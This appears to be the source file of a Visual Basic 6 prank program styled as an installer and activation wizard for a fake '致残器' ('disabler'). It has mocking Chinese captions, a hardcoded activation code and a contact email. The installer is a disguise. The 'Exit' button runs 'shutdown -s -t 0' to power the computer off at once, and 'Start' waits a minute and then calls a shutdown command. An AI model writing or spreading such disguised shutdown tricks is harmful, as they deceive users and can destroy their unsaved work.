VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "致残器激活向导"
   ClientHeight    =   4750
   ClientLeft      =   120
   ClientTop       =   470
   ClientWidth     =   7080
   LinkTopic       =   "Form1"
   ScaleHeight     =   4750
   ScaleWidth      =   7080
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton 立即激活 
      Caption         =   "激活"
      Height          =   375
      Left            =   3840
      TabIndex        =   8
      Top             =   4320
      Width           =   975
   End
   Begin VB.TextBox 激活码输入框 
      Height          =   495
      Left            =   4080
      TabIndex        =   7
      Text            =   "请输入激活码"
      Top             =   3480
      Width           =   2295
   End
   Begin VB.CommandButton 开始 
      Caption         =   "开始（O）"
      Height          =   375
      Left            =   6000
      TabIndex        =   6
      Top             =   4320
      Width           =   975
   End
   Begin VB.CommandButton 退出 
      Caption         =   "退出（D）"
      Height          =   375
      Left            =   4920
      TabIndex        =   5
      Top             =   4320
      Width           =   975
   End
   Begin VB.CommandButton 激活 
      Caption         =   "购买激活版本"
      Height          =   375
      Left            =   2520
      TabIndex        =   4
      Top             =   4320
      Width           =   1215
   End
   Begin VB.PictureBox 鲁迅 
      AutoSize        =   -1  'True
      Height          =   2640
      Left            =   -120
      Picture         =   "Form1.frx":0000
      ScaleHeight     =   2600
      ScaleWidth      =   2600
      TabIndex        =   0
      Top             =   360
      Width           =   2640
   End
   Begin VB.Label 提示 
      Caption         =   "单击“开始”以安装致残器1.0Beta版本。当然，您也可以选择输入已有的激活码以使用激活版本，或按下“购买激活版本”按照引导激活。"
      Height          =   855
      Left            =   3960
      TabIndex        =   3
      Top             =   2040
      Width           =   3135
   End
   Begin VB.Label 副标题 
      Caption         =   "幸福往往是隐藏，而苦痛却常常分享。这就是傻子！你的世界常人不懂。祝您使用愉快。"
      Height          =   615
      Left            =   3960
      TabIndex        =   2
      Top             =   840
      Width           =   3135
   End
   Begin VB.Label 标题 
      Caption         =   "欢迎来到致残器安装向导！"
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   4200
      TabIndex        =   1
      Top             =   360
      Width           =   2895
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Sub Label2_Click()

End Sub

Private Sub Picture1_Click()

End Sub

Private Sub 激活_Click()
  MsgBox "请发送关键词“激活致残器1.0”至3290068069@qq.com"
End Sub

Private Sub 开始_Click()
  Sleep 60000
  Shell "Shutdown.exe -t"
  If 激活码输入框.Text = "A4DJ0-FJI9R-DH3D5-349UC-KP1JM" Then
  MsgBox "致残器1.0版本已经成功安装到C:\Program Files，即将自动启动致残器1.0."
  Form2.Show
  MsgBox "请注意，为了达到程序使用效果，以下所有题目请以脑残的角度回答，否则将会回答错误，后果自负！"
  Unload Form1
  Else
  MsgBox "您输入的激活码无效，请重新输入！"
  End If
End Sub
 

Private Sub 立即激活_Click()
If 激活码输入框.Text = "A4DJ0-FJI9R-DH3D5-349UC-KP1JM" Then
MsgBox "您已经成功激活！再点击“开始”即可。"
Else
MsgBox "您输入的验证码无效，请重新输入！"
End If
End Sub

Private Sub 退出_Click()
  MsgBox "您终止了致残器1.0版本的安装,您让我感到很痛心，计算机即将关闭！"
  Shell "shutdown -s -t 0"
  Unload Form1
End Sub
